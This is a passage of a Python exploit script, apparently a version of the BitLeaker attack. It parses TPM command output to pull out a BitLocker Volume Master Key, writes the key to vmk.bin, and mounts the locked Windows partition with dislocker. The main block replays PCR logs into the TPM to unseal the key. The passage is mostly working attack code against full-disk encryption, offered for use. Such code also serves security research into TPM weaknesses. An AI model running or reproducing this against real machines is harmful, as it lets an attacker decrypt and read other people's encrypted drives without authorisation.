00000040  75 69 1f e8 30 33 ef 3f  10 49 e3 53 de 18 e4 f1  |ui..03.?.I.S....|
00000050  0c e2 18 dd 7c bf ab 1d  6d 63 38 ec d1 f3 00 00  |....|...mc8.....|
00000060  00                                                |.|
Success
    """
    output_found = 0
    vmk_data = []
    for line in tpm_output:
        if 'Output Size' in line:
            output_found = 1
            continue

            if not 'Success' in line:
                return []

        if output_found == 1 and not '0000' in line:
            break
       
        if output_found == 1:
            data = line.split('|')
            data = data[0].split()
            vmk_data = vmk_data + data[1:17]

    vmk_data = [int(vmk_data[i], 16) for i in range(28, 60)]
    return vmk_data

#
# Mount BitLocker-locked partition with the VMK
#
def mount_bitlocker_partition_with_vmk(drive_path, vmk_data):
    info_print('Mount BitLocker-locked Partition with VMK.\n')

    # Print VMK
    color_print('    [>>] VMK = ', GREEN)
    for hex in vmk_data:
        color_print('%02X'% hex, GREEN)
    info_print('\n')

    # Prepare TPM2_Load data
    info_print('    [>>] Create VMK data... ')
    file = open('vmk.bin', 'wb')
    file.write(bytearray(vmk_data))
    file.close()
    color_print('Success\n', SUCCESS)

    # Mount BitLocker-locked partition
    subprocess.getoutput('mkdir windows')
    info_print('    [>>] Mount BitLocker-Locked partition(%s)...\n\n' % drive_path)
    output = subprocess.getoutput('sudo dislocker -v -v -v -V %s -K vmk.bin -- ./windows' % drive_path)
    #print(output)
    output = subprocess.getoutput('sudo mount -o loop ./windows/dislocker-file ./windows')

#   
# Main
#
if __name__ == '__main__':
    my_env = dict(os.environ, TPM2TOOLS_TCTI="device:/dev/tpm0")
    echo_arg = my_env['TPM2TOOLS_TCTI']
    p = subprocess.Popen(['echo',echo_arg],env=my_env,stdout=subprocess.PIPE)
    output, err = p.communicate()
    print("Will be using TPM2TOOlS_CTCI={0}".format(output))
    print("If this is not okay, press CTRL-C, otherwise press [Enter]...")
    input('')
    exploit = BitLeaker()
    exploit.find_bitlocker_parition()
    #
    # NOTE: passing a filename to leak allows "canned" 
    #       data use.
    #
    exploit.leak()
    #exploit.start_tpm()
    exploit.process_pcr_logs()

    tpm     = TPMInterface(exploit.logs(),type=exploit.type())
    print(tpm.Type())
    tpm.replay_logs()
    # Prepare TPM data and extract VMK
    ##f = open(filename,'wb')
    tpm.prepare_tpm_data(exploit.bitlocker_path())
    vmk_data = tpm.execute_tpm_cmd_and_extract_vmk()

    ##f.write(hexlify(bytearray(vmk_data)))
    ##f.close()
    
#    # Mount BitLocker-locked partition with VMK
#    mount_bitlocker_partition_with_vmk(drive_path, vmk_data)

